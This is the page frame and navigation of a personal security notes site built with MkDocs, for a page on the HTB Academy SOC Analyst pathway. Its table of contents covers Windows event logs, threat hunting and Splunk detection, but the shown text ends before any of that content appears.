
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://miranda-bai.github.io/HTB/Academy/SOC%20Analyst/">
      
      
        <link rel="prev" href="../Introduction%20to%20Windows%20Command%20Line/">
      
      
        <link rel="next" href="../Web%20requests/">
      
      
      <link rel="icon" href="../../../assets/logo.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.4">
    
    
      
        <title>SOC Analyst Pathway - Notes & Writeups</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-blue" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#soc-analyst-pathway" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Notes &amp; Writeups" class="md-header__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Notes & Writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              SOC Analyst Pathway
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Bug%20Bounty/Overlong%20UTF-8%20encoding%20attack/" class="md-tabs__link">
          
  
  Bug Bounty

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../CISSP%20Pre/Glossaries/" class="md-tabs__link">
          
  
  CISSP Pre

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../API%20attack/" class="md-tabs__link">
          
  
  HTB

        </a>
      </li>
    
  

    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Notes/Change%20Mysql%20pw%20in%20Linux/" class="md-tabs__link">
          
  
  Notes

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../OSWE/Checklist/" class="md-tabs__link">
          
  
  OSWE

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../OffSec%20playground/CVE-2024-25180/" class="md-tabs__link">
          
  
  OffSec playground

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Others/Bastion/" class="md-tabs__link">
          
  
  Others

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../PortSwigger%20Labs/Access%20control%20vulnerabilities/" class="md-tabs__link">
          
  
  PortSwigger Labs

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Notes &amp; Writeups" class="md-nav__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    Notes & Writeups
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Bug Bounty
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Bug Bounty
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Bug%20Bounty/Overlong%20UTF-8%20encoding%20attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Overlong UTF-8 Encoding Attack
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    CISSP Pre
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            CISSP Pre
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/Glossaries/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Glossaries
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/Question%20review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Question Review
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    1 Security and Risk Management
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            1 Security and Risk Management
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 1 Security and Risk Managment 16%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 1 Security Governance Through Principles and Policies
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 2 Personnel Security and Risk Management Concepts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%203/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 3 Business Continuity Planning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%204/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 4 Laws, Regulations, and Compliance
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2 Asset Security
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4">
            <span class="md-nav__icon md-icon"></span>
            2 Asset Security
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/2-Asset%20Security/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 2 Asset Security 10%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/2-Asset%20Security/Chapter%205/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 5 Protecting Security of Assets
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    3 Security Architecture and Engineering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            3 Security Architecture and Engineering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 3 Security Architecture and Engineering 13%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%2010/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 10 Physical Security Requirements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%206/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 6 Cryptography and Symmetric Key Algorithms
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%207/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 7 PKI and Cryptographic Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 8 Principles of Security Models, Design, and Capabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%209/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 9 Security Vulnerabilities, Threats, and Countermeasures
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
        
          
          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    4 Communication and Network Security
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6">
            <span class="md-nav__icon md-icon"></span>
            4 Communication and Network Security
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 4 Communication and Network Security 13%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2011/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 11 Secure Network Architecture and Components
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2012/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 12 Secure Communications and Network Attacks
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
        
          
          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    5 Identity and Access Managment
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_7">
            <span class="md-nav__icon md-icon"></span>
            5 Identity and Access Managment
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 5 Identity and Access Management (IAM) 13%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2013/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 13 Managing Identity and Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2014/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 14 Controlling and Monitoring Access
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
        
          
          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    6 Security Assessment and Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_8">
            <span class="md-nav__icon md-icon"></span>
            6 Security Assessment and Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 6 Security Assessment and Testing 12%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/Chapter%2015/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 15 Security Assessment and Testing
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9" >
        
          
          <label class="md-nav__link" for="__nav_3_9" id="__nav_3_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    7 Security Operations
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_9">
            <span class="md-nav__icon md-icon"></span>
            7 Security Operations
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/7-Security%20Operations/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 7 Security Operations 13%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2016/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 16 Managing Security Operations
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2017/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 17 Preventing and Responding to Incidents
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2018/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 18 Disaster Recovery Planning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2019/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 19 Investigations and Ethics
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10" >
        
          
          <label class="md-nav__link" for="__nav_3_10" id="__nav_3_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    8 Software Development Security
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10">
            <span class="md-nav__icon md-icon"></span>
            8 Software Development Security
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/0-Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain 8 Software Development Security 10%
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2020/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 20 Software Development Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2021/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 21 Malicious Code and Application Attacks
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  <span class="md-ellipsis">
    HTB
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            HTB
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" checked>
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Academy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../API%20attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    API attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Introduction%20to%20Bash%20Scripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction to Bash Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Introduction%20to%20Web%20App/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction to Web APPs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Introduction%20to%20Windows%20Command%20Line/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction to Windows Command Line
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    SOC Analyst Pathway
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    SOC Analyst Pathway
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#useful-windows-event-logs" class="md-nav__link">
    <span class="md-ellipsis">
      Useful Windows Event Logs
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Useful Windows Event Logs">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-windows-system-logs" class="md-nav__link">
    <span class="md-ellipsis">
      1. Windows System Logs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-windows-security-logs" class="md-nav__link">
    <span class="md-ellipsis">
      2. Windows Security Logs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-event-logging-basics-exercises" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Event Logging Basics exercises
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Event Logging Basics exercises">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#skill-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skill assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hunting-for-stuxbot" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting For Stuxbot
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Hunting For Stuxbot">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hunting-for-stuxbot-round-2" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting For Stuxbot (Round 2)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#understanding-log-sources-investigating-with-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding Log Sources &amp; Investigating with Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Understanding Log Sources & Investigating with Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#spl" class="md-nav__link">
    <span class="md-ellipsis">
      SPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#introduction-to-splunk-spl" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction To Splunk &amp; SPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-splunk-applications" class="md-nav__link">
    <span class="md-ellipsis">
      Using Splunk Applications
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#intrusion-detection-with-splunk-real-world-scenario" class="md-nav__link">
    <span class="md-ellipsis">
      Intrusion Detection With Splunk (Real-world Scenario)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-attacker-behavior-with-splunk-based-on-ttps" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Attacker Behavior With Splunk Based On TTPs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-attacker-behavior-with-splunk-based-on-analytics" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Attacker Behavior With Splunk Based On Analytics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
